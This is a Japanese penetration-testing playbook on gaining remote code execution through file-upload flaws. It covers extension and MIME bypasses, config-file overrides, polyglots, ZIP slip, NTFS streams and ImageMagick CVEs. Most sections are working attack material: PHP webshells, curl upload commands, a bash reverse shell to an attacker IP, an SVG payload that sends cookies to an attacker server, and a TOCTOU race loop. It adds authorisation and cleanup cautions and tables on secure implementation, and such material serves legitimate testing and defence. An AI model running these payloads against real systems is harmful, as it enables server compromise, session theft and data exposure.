# 未認証ファイルアップロードによる RCE

> **スコープ**: Web アプリのファイルアップロード機能悪用による webshell 設置と RCE、および型判定（MIME / 拡張子 / マジックバイト）の回避。基本アップロード〜各種バイパス（拡張子・MIME・filename traversal / .htaccess 等設定ファイル / ポリグロット / 再エンコード生存 / SVG XSS / NTFS ADS / ZIP slip / 変換ライブラリ CVE / null byte / TOCTOU）〜PoC 信頼性確認まで扱う。シェル取得後の安定化は `../../03_Post_Access_Linux/Shell_Stabilization.md` を参照。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 不可逆な変更を含む（アップロードファイルが残存する）
> - [x] 業務停止リスク（`.htaccess` / `.user.ini` の上書きは同ディレクトリの挙動を変える / webshell 放置でピボット起点になる）
> - [ ] 持続化に該当
> - [ ] SIEM/EDR で確実に検知される
>
> 実施可否は事前合意で明示確認すること。**`.htaccess` / `.user.ini` / `web.config` を書き換えた場合は原状回復必須**（元の内容を保存してから書き換える）。演習環境（HTB / OSCP 等）では制約なし。

## 着火条件

- Web アプリにファイルアップロード機能がある
- **認証チェックがサーバー側で行われていない**（セッション不要でアップロードエンドポイントに直接 POST できる）
- アップロードしたファイルに Web からアクセスできる（アップロードディレクトリが公開されている）
- サーバーがスクリプト言語（PHP・ASP.NET・JSP 等）を実行できる

> **着火シグナル:** アプリ名とバージョンが判明した時点で searchsploit に「unauthenticated file upload」ヒットがあれば即検討。ソースコードが入手できる場合は `upload.php` 等のアップロードハンドラを直接読んで認証チェックの有無を確認する。

## 環境前提
- 実行環境: テスター端末
- 必要なツール: `curl`（ペネトレ用 Linux ディストリ標準）/ `python3`（標準搭載）/ `nc`（リバースシェル受信）/ `exiftool`（メタデータ埋め込み・標準搭載が多い）
- オフライン代替: `curl` は全環境で使用可。`python3 requests` が必要な場合は `pip install requests --break-system-packages`

## 先に確認すること

- アップロードエンドポイントの URL（例: `/upload.php` / `/api/upload`）を特定する
- アップロードしたファイルが保存・公開されるパスを特定する（例: `/upload/` / `/files/`）
- サーバーがどのスクリプト言語を実行するか確認する（レスポンスヘッダー・nmap バナー）
- アップロード後にサーバー側で**再エンコード・サムネイル生成・トランスコード**が走るか確認する（走るなら §5 / §9 が候補、走らないなら EXIF/メタデータ系が温存される）

**バイパス手法の早見表:**

| バイパス手法 | 概要 | 使う場面 |
|------------|------|---------|
| 二重拡張子 | `shell.php.png` として送信 → `.php` として実行 | 末尾拡張子のみチェックしているとき |
| 逆二重拡張子 | `shell.php.jpg` ではなく `shell.jpg.php`／環境により `shell.php.jpg` | **先頭拡張子**で実行判定する設定（古い Apache `mod_mime` の多重拡張子解釈）|
| 拡張子の大文字小文字 | `.pHp` / `.PhP` | 大小を区別する素朴なブラックリスト |
| 拡張子リスト外 | `.php5` / `.phtml` / `.phar` / `.pht`（PHP）、`.asp` / `.aspx` / `.ashx` / `.cer`（IIS）| 特定拡張子のみブラックリストで弾くとき |
| マジックバイト前置 | PNG マジックバイト（`\x89\x50\x4e\x47...`）をファイル先頭に追加 | 先頭バイトで種別判定しているとき |
| Content-Type 偽装 | `Content-Type: image/png` を指定しながらスクリプトを送信 | MIME タイプのみチェックしているとき |
| 代替 MIME | `text/php` / `application/php` 等の別表記 | 厳格な MIME ホワイトリストの抜け |
| Content-Type ヘッダ重複 | 許可型と実型の 2 つを並べてパーサを混乱させる | 複数の検証層で異なるヘッダを参照するとき |
| 代替スクリプトタグ | `<script language="php">...</script>` / `<?= ?>` | `<?php` という文字列自体をフィルタしているとき |
| ファイル名特殊文字 | 末尾ドット・空白・`%00`・RTLO・UTF-8・スラッシュ | Windows の拡張子正規化・truncation バグ |

**攻撃者の思考トレース:** まず直球（§1）で試し、弾かれたら「**どこで弾いたか**」を切り分ける（§MIME 判定の3箇所モデル参照）。「拡張子ブラックリスト + アップロードディレクトリが公開」という 2 条件が揃えば、ほぼ必ず何かのバイパスが効く。型判定が堅い（再エンコードする）場合は RCE を諦めて SVG/HTML による XSS（§6）か変換ライブラリ CVE（§9）に切り替える。

---

## MIME / 型判定の3箇所モデルと検証別バイパス

ファイルアップロードで「型」は **3 つの異なる場所**に出てくる。**どこを誰がチェックしているか**で効く回避が変わる。ここを混同しないことが回避の起点。

```
[1] リクエスト全体のヘッダ
    Content-Type: multipart/form-data; boundary=----xxxx   ← フォーム送信の枠組み（RFC 7578）

[2] multipart 各パートの Content-Type   ← クライアントが完全制御・偽装自由
    Content-Disposition: form-data; name="file"; filename="shell.php"
    Content-Type: image/png                ← 「MIME が image/png なら通す」の判定対象

    <?php system($_GET['c']); ?>

[3] サーバがファイルを返すときの レスポンス Content-Type   ← 実行/描画されるかを決める
    Content-Type: image/svg+xml            ← ブラウザがこれを見て XSS 発火するか決める
```

| 場所 | 誰が決める | 攻撃上の意味 |
|---|---|---|
| [1] リクエスト全体 | クライアント | 通常いじらない |
| [2] パートの Content-Type | **攻撃者** | サーバがこれを信じて検証していれば 1 行偽装で突破（§1） |
| [3] レスポンスの Content-Type | **サーバ** | 取得時に実行/描画されるかの決定要因。XSS・ダウンロード強制の鍵（§6） |

> **重要:** [2]（アップロード時の申告 MIME）と [3]（取得時の応答 MIME）は別物。`image/png` と偽装して通っても、サーバが取得時に `text/html` で返せば XSS、`image/png` で返せば（sniff されない限り）ただの画像。

**MIME タイプ別「何ができるか」:**

| MIME タイプ | 何か | アップロード時に偽装すると | その MIME で**サーバが返す**と起きること |
|---|---|---|---|
| `image/png` `image/jpeg` `image/gif` | ラスタ画像 | 検証通過のカバー。中身は webshell でも可（polyglot / magic byte 前置）| ただの画像表示。sniff されなければ安全側 |
| `image/svg+xml` | XML ベースのベクタ画像 | 「画像」として通りやすい | **格納型 XSS**。SVG は `<script>` / `onload` を持てる |
| `text/html` | HTML 文書 | まず弾かれる | **格納型 XSS**。アップロード HTML がそのまま描画 |
| `application/xml` `text/xml` | XML 文書 | パーサに渡る経路があれば | **XXE**（外部実体でファイル読取・SSRF）|
| `application/pdf` | PDF | 通りやすい | PDF 内 JavaScript・ビューア依存 XSS |
| `application/zip` 等 | アーカイブ | 展開系アップローダで | **ZIP slip**（§8）|
| `application/x-httpd-php` | PHP スクリプト | 申告すると逆に弾かれやすい | サーバ設定次第で**コード実行**（通常は拡張子で決まる）|
| `application/octet-stream` | 任意バイナリ（不明）| 「型不明」で検証を素通りすることがある | 多くのブラウザがダウンロード強制（XSS に不利）|

**サーバ側の検証方法 → 回避法の対応:**

| サーバ側の検証方法 | 何を見ているか | 回避法 |
|---|---|---|
| パートの Content-Type を信用 | リクエスト [2] の文字列 | `image/png` 等に書き換える（curl `;type=image/png`）|
| 拡張子ブラックリスト | `.php` 等を拒否 | 逆二重拡張子 / 大文字小文字 / `.php5` `.phtml` `.phar`（PHP）/ `.aspx` `.ashx` `.cer`（IIS）|
| 拡張子ホワイトリスト（末尾のみ）| 末尾が `.png` か | `.htaccess` / `.user.ini` で画像拡張子を実行に割当（§3）|
| マジックバイト検査（`finfo` / `mime_content_type`）| 先頭バイト | マジックバイト前置・polyglot（§4）|
| `getimagesize()` で画像構造検証 | 画像として valid か | 本物の画像にスクリプトを連結した polyglot（§4）|
| 再エンコード（画像を作り直す）| 出力画像のみ保存 | 圧縮を生存する payload（§5）。EXIF/コメントは剥がれるので別経路へ |

**MIME sniffing（型推測）:** サーバが `image/png` で返しても、ブラウザが中身を見て HTML と判断して実行することがある（WHATWG MIME Sniffing Standard）。`X-Content-Type-Options: nosniff` が**無い**＝攻撃側に有利なシグナル。

```bash
# [Attacker] レスポンスの Content-Type と nosniff の有無を確認
curl -sI "http://[TARGET]/upload/[UPLOADED_FILE]" | grep -iE "content-type|x-content-type-options"
```

**base64 シグネチャ早見表（JSON / `data:` URI でファイルを base64 送信する API 向け）:**

生バイトではなく base64 文字列を送る実装では、**base64 の先頭数文字**で型判定/偽装できる（3 バイト境界が揃った先頭ブロックは決定的に変換されるため固定値になる）。

| base64 先頭 | 元のマジックバイト | MIME |
|---|---|---|
| `iVBORw0KGgo` | `\x89PNG\r\n\x1a\n` | `image/png` |
| `/9j/` | `\xFF\xD8\xFF` | `image/jpeg` |
| `R0lGODdh` / `R0lGODlh` | `GIF87a` / `GIF89a` | `image/gif` |
| `JVBERi0` | `%PDF-` | `application/pdf` |
| `PK` | `PK\x03\x04` | `application/zip`（docx/xlsx/jar も）|
| `PHN2Zy` / `PD94bWw` | `<svg` / `<?xml` | `image/svg+xml` / XML |

> 出典: IANA Media Types registry / RFC 6838・2045・2046（MIME）/ RFC 7578（multipart/form-data）/ WHATWG MIME Sniffing Standard / OWASP File Upload Cheat Sheet。ファイルシグネチャは各フォーマット仕様（PNG=RFC 2083 等）。

---

## 1. 基本的な webshell アップロード〜RCE

**事前準備（必須）:**

```bash
# [Attacker] リスナー起動（別ターミナル）
nc -lnvp 4444
```

**コマンド:**

```bash
# [Attacker] PHP webshell を作成
echo '<?php echo shell_exec($_GET["cmd"]); ?>' > shell.php

# [Attacker] 二重拡張子 + Content-Type 偽装でアップロード
curl -s -X POST "http://[TARGET]/upload.php?id=test" \
  -F "file=@shell.php;filename=shell.php.png;type=image/png" \
  -F "pupload=upload"

# [Attacker] アップロード先で動作確認
curl "http://[TARGET]/upload/test.php?cmd=whoami"
# → [HOSTNAME]\[USER] のような出力が返れば webshell 動作確認完了

# [Attacker] Linux: bash リバースシェルを URL エンコードして実行
curl "http://[TARGET]/upload/shell.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/[ATTACKER_IP]/4444+0%3E%261%27"
```

**`<?php` 文字列がフィルタされる場合の代替タグ:**

```php
// 代替①: script タグ形式（古い PHP / 一部設定で有効）
<script language="php">system($_GET['cmd']);</script>

// 代替②: short echo タグ（short_open_tag 有効時）
<?= system($_GET['cmd']) ?>
```

**Python による PNG マジックバイト前置アップロード（curl でバイパスできない場合）:**

```python
# [Attacker] ファイル: upload_shell.py
import requests
url = "http://[TARGET]/upload.php?id=test"
s = requests.Session()
s.get(url, verify=False)
PNG_magic = b'\x89\x50\x4e\x47\x0d\x0a\x1a\x0a'
payload_code = b'<?php echo shell_exec($_GET["cmd"]); ?>'
png = {'file': ('test.php.png', PNG_magic + b'\n' + payload_code, 'image/png', {'Content-Disposition': 'form-data'})}
data = {'pupload': 'upload'}
r = s.post(url=url, files=png, data=data, verify=False)
print(r.status_code, r.text[:200])
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `whoami` でユーザー名が返る | webshell 動作確認完了 | リバースシェルへ昇格 |
| アップロードは成功するがスクリプトとして実行されない | アップロードディレクトリがスクリプト実行禁止 | 別ディレクトリを探す / §3 設定ファイル上書きへ |
| 拡張子が弾かれる | ホワイトリスト制御 | `.php5` / `.phtml` / 大文字小文字 / 逆二重拡張子を試す |
| `<?php` を含むと弾かれる | 文字列ベースのフィルタ | 上記の代替タグ（`<script language="php">` / `<?=`）を使う |

**注意（原状回復）:** テスト完了後にアップロードした webshell を削除する。`curl "http://[TARGET]/upload/"` でファイル一覧を確認 → 手動削除または DELETE リクエスト。`shell_exec` が無効なら `system()` / `passthru()` / `exec()` を代替に試す。

---

## 2. filename パラメータでのパストラバーサル

multipart の `filename=` フィールドにパストラバーサルを混ぜると、`dirname/basename` のみ切り出していない実装で**指定先に直接書き込める**ことがある。アップロードディレクトリが非公開（実行不可）でも、公開ディレクトリに `.php` を置けば実行に持ち込める。

**コマンド:**

```bash
# [Attacker] filename にパストラバーサルを仕込む
curl -F 'file=@shell.php;filename=../../../var/www/html/shell.php' http://[TARGET]/upload

# 試す保存先候補
# ../../../var/www/html/shell.php     # Apache / Nginx 公開ルート
# ../../public/uploads/shell.php      # Web 公開直下
# ../templates/shell.php              # CMS テンプレート（読込時に実行）
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| アップロード後 `/shell.php?cmd=id` で実行できる | filename traversal 成立 | §1 のリバースシェルへ |
| 400 / エラー | サーバー側でパスを検証 | §3 設定ファイル上書きへ |

**注意（原状回復）:** 書き込んだ webshell をテスト完了後に削除する（`curl -X DELETE` または WebShell 経由で `rm`）。

---

## 3. 設定ファイル自体のアップロード（.htaccess / .user.ini / web.config / uwsgi.ini / .pth）

拡張子ブラックリストが堅くてスクリプト拡張子が全て弾かれる環境では、**サーバ/ランタイムの設定ファイルを上げて、無害な拡張子を実行に割り当てる**経路がある。スタックごとに使うファイルが違う。

**Apache（`.htaccess`）/ PHP（`.user.ini`）:**

```bash
# [Attacker] .htaccess を upload/ に置いて PHP 実行を許可させる
cat > .htaccess << 'EOF'
AddType application/x-httpd-php .png .jpg .gif
EOF
curl -F 'file=@.htaccess;filename=.htaccess' http://[TARGET]/upload

# [Attacker] .user.ini（PHP 5.3+）— auto_prepend_file で強制 include
cat > .user.ini << 'EOF'
auto_prepend_file = "shell.png"
EOF
curl -F 'file=@.user.ini;filename=.user.ini' http://[TARGET]/upload

# [Attacker] その後 shell.png（中身は PHP）をアップロード
echo '<?php system($_GET["cmd"]); ?>' > shell.png
curl -F 'file=@shell.png' http://[TARGET]/upload
# /upload/shell.png にアクセス → PHP として実行
```

**IIS（`web.config`）:** アップロードディレクトリに `web.config` を置いてハンドラマッピングを書き換え、任意拡張子を ASP/実行扱いにする。`.config` がアップロード許可拡張子に含まれている／拡張子チェックを潜れると成立。

**uWSGI（`.ini`）:** uWSGI の設定ファイルは `@(exec://command)` のようなマジック変数を解釈する。設定が再読込される経路に `uwsgi.ini` を置くと**パース時にコマンドが実行**される（ファイル include・HTTP fetch・プロセス stdout 読取もできる）。

**Python（`.pth`）:** site-packages 配下に置かれた `.pth` ファイルは、`import` で始まる行をインタプリタ起動時に実行する。アップロード先が Python のパッケージ検索パスに入る稀なケースで、インタプリタ起動時コード実行になる。`package.json` / `composer.json` も script フックで同種の実行が起きうる。

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `/upload/shell.png?cmd=id` でコマンドが実行される | .htaccess / .user.ini 経由の PHP 実行 | §1 のリバースシェルへ |
| `.htaccess` が弾かれる | .htaccess のアップロードを拒否 | `.user.ini` / `web.config`（IIS）を試す |
| IIS バナーが出ている | Apache 系の `.htaccess` は無効 | `web.config` を使う |

**注意（原状回復）:** `.htaccess` / `.user.ini` / `web.config` を書き換えた場合は**元の内容を保存してから書き換え**、テスト完了後に必ず元に戻す。同ディレクトリの他ファイルの挙動が変わる高影響操作。

---

## 4. ポリグロット（画像 + スクリプト）

Content-Type / マジックバイト判定（`getimagesize()` 等）を通過させるために、画像として valid な先頭 + スクリプト本体を連結する。

**コマンド:**

```bash
# [Attacker] GIF マジックバイト + PHP
printf 'GIF89a;\n<?php system($_GET["cmd"]); ?>\n' > shell.gif
# getimagesize() は GIF として認識・ファイル拡張子が .php で保存されれば PHP として実行

# [Attacker] 実存 PNG ファイル末尾に PHP を追記
cp legit.png poly.png
echo '<?php system($_GET["cmd"]); ?>' >> poly.png
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| 画像として受け入れられて PHP として実行される | ポリグロット成立 | §1 のリバースシェルへ |
| 画像 check は通るが PHP として実行されない | アップロードディレクトリがスクリプト実行禁止 | §2 filename traversal / §3 設定ファイルへ |
| アップロード後に画像が再エンコードされ payload が消える | サーバが画像を作り直している | §5 再エンコード生存へ |

---

## 5. 画像の再エンコードを生存する payload（compression survival / メタデータ）

サーバがアップロード画像をリサイズ・再エンコード（`convert` 等）する場合、末尾追記やコメント領域の payload は**剥がれて消える**。これを生存させるには、画像の**圧縮アルゴリズムが保持する領域**に payload を埋め込むか、再エンコードが無い経路で EXIF を使う。

**コマンド:**

```bash
# [Attacker] EXIF コメントに PHP を埋め込む（再エンコードが「無い」場合に有効）
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legit.jpg -o shell.jpg
# 拡張子を .php として保存させられれば実行に持ち込める

# [Attacker] 再エンコード「あり」を生存させる専用ジェネレータ（外部ツール）
# PayloadsAllTheThings 配下のスクリプトを使う:
#   createBulletproofJPG.py / createPNGwithPLTE.php / createGIFwithGlobalColorTable.php
# いずれもリサイズ後も特定チャンク（PLTE / Global Color Table 等）に payload が残るよう構成する
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| 再エンコード後も `?cmd=id` が通る | 圧縮生存 payload 成立 | §1 のリバースシェルへ |
| EXIF を入れたが消えている | サーバが再エンコードしている | 専用ジェネレータ（PLTE/GCT 系）へ切替 |
| どうやっても実行に至らない | 出力が純粋なラスタのみ | RCE は諦め §6 SVG XSS / §9 変換ライブラリ CVE へ |

**注意:** 専用ジェネレータはインターネットアクセスが必要（GitHub から取得）。オフライン環境では事前に作業端末へ取得しておく。再エンコードの有無は §4 で「末尾追記が消えるか」を観測して判定する。

---

## 6. SVG 内 JavaScript（保存型 XSS への昇格）

SVG は XML で `<script>` タグや `onload` 属性を持てる。**画像扱いで受け入れられがちなのに XSS のキャリアになる。**

**コマンド（SVG ペイロード）:**

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://[ATTACKER_HTTP_SERVER]/c?'+document.cookie)">
  <script type="text/javascript">
    fetch('http://[ATTACKER_HTTP_SERVER]/c?'+document.cookie);
  </script>
</svg>
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| アップロード後 URL を直接ブラウザで開くと XSS 発火 | SVG が Content-Type `image/svg+xml` で直接表示される経路 | セッション窃取 → `XSS.md` |
| `<img src="...">` 経由のレンダリングのみ | スクリプト実行不可（サンドボックス）| SVG の XSS 成立は難しい |

**注意:** アップロード後の URL が `<img>` ではなく**直接ブラウザで表示される経路**（プレビュー / Content-Type `image/svg+xml`）なら XSS 成立。応答に `X-Content-Type-Options: nosniff` が無ければ、画像として返る他形式でも sniff 経由で HTML 実行される余地がある（§MIME 判定の3箇所モデル参照）。

---

## 7. NTFS Alternate Data Streams（IIS / Windows）

Windows（NTFS）では `filename:stream` 構文で代替データストリームに書き込める。これを filename に使うと、**拒否される拡張子のファイルを実体として作りつつ、検証は別の見かけ拡張子を見る**実装ミスを突ける。Windows + IIS 限定。

**コマンド:**

```bash
# [Attacker] ::$DATA で拡張子チェックを潜る（shell.aspx を実体として作成）
curl -F 'file=@shell.aspx;filename=shell.aspx::$DATA' http://[TARGET]/upload

# [Attacker] コロンで「許可拡張子に見せる」ADS 名
curl -F 'file=@shell.aspx;filename=shell.aspx:.jpg' http://[TARGET]/upload
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `shell.aspx` が生成され実行できる | ADS 経由の拡張子バイパス成立 | §1 のリバースシェルへ（Windows 用 payload）|
| ファイルが作られない / 404 | NTFS でない・正規化されている | §3 `web.config` / §2 traversal へ |

**注意:** Linux サーバーでは無効（NTFS 固有）。バナー・エラーメッセージで IIS / Windows を確認してから試す。

---

## 8. ZIP slip（アーカイブ展開系アップロード）

ZIP / TAR / RAR を受け取って展開するアップローダで、エントリ名に `../` を含めると展開先の外に書き出せる。

**コマンド:**

```bash
# [Attacker] ZIP slip ペイロード（python で生 ZIP を組み立て）
mkdir -p tmpzip && cd tmpzip
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -c "
import zipfile
with zipfile.ZipFile('../slip.zip', 'w') as z:
    z.writestr('../../../var/www/html/shell.php', open('shell.php').read())
"
# slip.zip をアップロード → サーバー側展開で /var/www/html/shell.php が出現
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `/shell.php?cmd=id` で実行できる | ZIP slip 成立 | §1 のリバースシェルへ |
| エントリパスを検証されて拒否 | サーバー側の ZIP slip 対策あり | §1〜§7 の別バイパスへ |

**注意（原状回復）:** 書き込んだ webshell を削除する。展開先の確認: `curl "http://[TARGET]/shell.php"` で 404 なら書き込まれていない。

---

## 9. 画像・動画変換ライブラリ経由の RCE / 任意ファイル読取（ImageTragick 他）

> **[HIGH IMPACT]** 変換処理サーバー上で**コード実行・任意ファイル読取**が起きる。本番では事前合意必須。アップロード後にサムネイル生成・トランスコードが走る経路でのみ成立。

アップロードファイルをサーバー側で ImageMagick / FFmpeg 等が処理する場合、細工したファイルでライブラリの脆弱性を突ける。型バイパスではなく**処理エンジンの脆弱性**。

| CVE | 対象 | 効果 | トリガ |
|---|---|---|---|
| CVE-2016-3714（ImageTragick）| ImageMagick | URL ハンドラ経由のコマンド実行 | 細工画像（MVG/MSL）を `convert` が処理 |
| CVE-2022-44268 | ImageMagick | 任意ファイル読取（出力 PNG メタデータに混入）| 細工 PNG を `convert` → `identify -verbose` で抽出 |
| FFmpeg HLS 系 | FFmpeg | 任意ファイル読取 | HLS プレイリストを内包した AVI 等を処理 |

**コマンド（CVE-2022-44268 の確認例）:**

```bash
# [Attacker] 読み取りたいパスを埋め込んだ細工 PNG を用意（PoC は公開アドバイザリ参照）
# アップロード → サーバが convert で処理 → 出力画像を取得

# [Attacker] 取得した出力 PNG からファイル内容を抽出
identify -verbose [DOWNLOADED_OUTPUT].png | grep -i "raw profile" -A 50
# Raw profile テキストに対象ファイルの内容が 16 進で混入している
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| 出力画像のメタデータにファイル内容が混入 | CVE-2022-44268 成立（任意ファイル読取）| `/etc/passwd` → 設定ファイル → 鍵類を順に読む |
| 変換時にコールバックが飛ぶ / コマンドが実行される | ImageTragick 系 RCE | §1 同様にリバースシェルへ |
| 何も起きない | パッチ済みライブラリ | バージョン確認できれば searchsploit で別 CVE を照合 |

**注意:** PoC ペイロードは記憶で組まず、各 CVE の公開アドバイザリ・searchsploit から取得して**読んでから**使う（§11）。任意ファイル読取で取得した内容は機微情報を含むため取扱注意。

---

## 10. null byte / TOCTOU（古典・特殊環境向け）

**null byte 埋め込み（PHP 5.3.x 以下 / 古い CGI 向け）:**

```bash
# [Attacker] `shell.php%00.png` を `shell.php` として保存しつつ拡張子チェックは `.png` を見る実装ミス
curl -F 'file=@shell.php;filename=shell.php%00.png' http://[TARGET]/upload
```

**TOCTOU レース（一時ファイルに先にアクセス）:**

```bash
# [Attacker] アップロードと並行に大量リクエストを撃つ
( curl -F 'file=@shell.php' http://[TARGET]/upload & )
for i in $(seq 1 10000); do
  curl -s "http://[TARGET]/tmp/[PREDICTABLE_TEMP_NAME]?cmd=id" &
done; wait
```

**観測される出力 → 次のアクション:**

| 手法 | 成立条件 | 次のアクション |
|---|---|---|
| null byte | PHP 5.3.4 未満 / Java 7 未満 / 古い C 拡張 | 成立したら §1 の webshell 手順へ |
| TOCTOU | 一時ファイル名が予測可能 + 一時保存が Web 公開ディレクトリ配下 + 検証に時間がかかる | 3 条件揃っていれば成立する可能性がある |

**注意:** null byte は現代環境（PHP 5.3.4+）ではほぼ閉じている。TOCTOU は一時ファイル名の予測可能性に依存する。

---

## 11. PoC の信頼性確認と事前検証

**コマンド:**

```bash
# [Attacker] PoC の詳細を確認（コードを作業フォルダにコピーする前に読む）
searchsploit -x [PATH_FROM_RESULTS]
```

**アップロードハンドラで確認すべき観点（ソース入手時）:**

| 確認する観点 | セキュアな実装 | 脆弱な実装（着火条件）|
|------------|-------------|-------------------|
| セッション確認 | `session_start(); if (!isset($_SESSION['user'])) { die(); }` | セッション確認なし |
| ファイルタイプ確認 | ホワイトリストで MIME を検証 + 再エンコード | MIME タイプをクライアント入力のまま信用 |
| 拡張子確認 | ホワイトリスト + 末尾拡張子のみ | ブラックリストのみ |
| 保存先 | Web 非公開ディレクトリ + ランダムファイル名 | `upload/` 等の公開パス + 元ファイル名そのまま |

---

## 刺さらなかったとき（全体）

| 症状 | 原因の推定 | 次のアクション |
|------|----------|--------------|
| アップロードは成功するがスクリプトとして実行されない | アップロードディレクトリがスクリプト実行禁止 | 別のアップロードディレクトリを探す / §3 設定ファイル上書きを試みる |
| 403 / 401 が返る | 認証チェックが存在する | 認証済みセッションの Cookie をヘッダーに付けて再送 |
| 拡張子が弾かれる（エラーメッセージあり） | ホワイトリスト制御 | §4 ポリグロット / §3 設定ファイル / §2 filename traversal / §7 ADS（IIS）へ |
| アップロード後に payload が消える | サーバが画像を再エンコードしている | §5 圧縮生存 payload / §6 SVG XSS / §9 変換ライブラリ CVE へ |
| アップロード後のパスが不明 | 保存先が非公開ディレクトリ | レスポンス本文・ソースコード・ディレクトリ列挙でパスを確認 |

---

## 注意点・落とし穴

- **ファイルの残存（原状回復）:** テスト完了後に webshell を削除する。`curl "http://[TARGET]/upload/"` でファイル一覧を確認
- PHP の `shell_exec` が無効なら `system()` / `passthru()` / `exec()` を代替に試す
- Content-Type の偽装だけでは通らない場合はマジックバイトの前置を組み合わせる（§MIME 判定の3箇所モデルで「どこを見ているか」を切り分ける）
- 申告 MIME（リクエスト）と応答 MIME（レスポンス）を混同しない。XSS は応答 MIME と sniff で決まる
- Windows で `nc.exe -e` を使う場合は `-e` 対応ビルド（`ncat.exe` または "-gaping security hole" 版）が必要

> **個別ブロック固有の注意は各 §N の「注意:」を参照。**

---

## 本番での前提

- **事前合意の要否**: ★★（ファイルアップロード機能の悪用は事前合意で範囲明示が必要。§9 変換ライブラリ CVE は ★★★）
- **業務影響リスク**: アップロードファイルが残存 / `.htaccess` `web.config` 書き換えで同ディレクトリの挙動変化 / 変換処理サーバーでの任意ファイル読取
- **原状回復必須項目**: ✅ アップロードした webshell ファイルを削除する / ✅ .htaccess / .user.ini / web.config を元の内容に戻す / ✅ 任意ファイル読取で取得した機微情報の破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 参照

- PayloadsAllTheThings「Upload Insecure Files」（公開コミュニティナレッジ集。拡張子・MIME・ADS・再エンコード生存・変換ライブラリ CVE の網羅一覧）
- OWASP File Upload Cheat Sheet（防御側の検証手法の体系）
- IANA Media Types registry / RFC 6838・2045・2046（MIME）/ RFC 7578（multipart/form-data）/ WHATWG MIME Sniffing Standard

> URL は記憶で書かず、各文書名で検索して一次情報を確認すること。CVE の PoC は公開アドバイザリ・searchsploit から取得する。

---

## 関連技術

- 前：Web アプリのフレームワーク・アプリ名の特定 → `../../01_Reconnaissance/Web_Enumeration.md`
- 前：searchsploit で「unauthenticated file upload」を確認 → `../../05_Tools_Reference/Searchsploit.md`
- 後：webshell からリバースシェルへの昇格 → `Command_Injection.md`（リバースシェル配信セクション）
- 後：Windows で初期シェル取得後の列挙 → `../../04_Post_Access_Windows_AD/Enumeration_Checklist.md`
- 関連：SVG 経由 XSS の詳細 → `XSS.md`
- 関連：XXE（XML / SVG を解析させる経路）→ `XXE.md`
- 関連：シェル取得後の安定化 → `../../03_Post_Access_Linux/Shell_Stabilization.md`
